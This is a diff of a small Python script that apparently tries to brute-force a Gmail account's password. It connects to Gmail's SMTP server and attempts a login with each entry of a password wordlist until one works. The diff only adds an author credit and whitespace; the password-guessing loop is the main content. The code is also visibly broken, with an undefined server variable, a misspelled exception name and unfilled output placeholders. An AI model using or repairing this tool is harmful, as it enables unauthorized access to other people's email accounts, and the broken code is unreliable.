@@ -1,3 +1,4 @@
+#by sid hocine from algeria
 import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com",587)
 smtpserver.ehlo()
@@ -11,8 +12,9 @@ passwfile = open(passwfile,"r")
 for password in passwfile:
          try :
                 smtplibserver.login(user,password)
-                print (" [+] password is fond===> %s")  
+                print (" [+] password is fond===> %s")
                 break;
          except smtplib.SMTPAuthenticatoinError:
                 print(" [+] password is not fond====> %s")
+
 
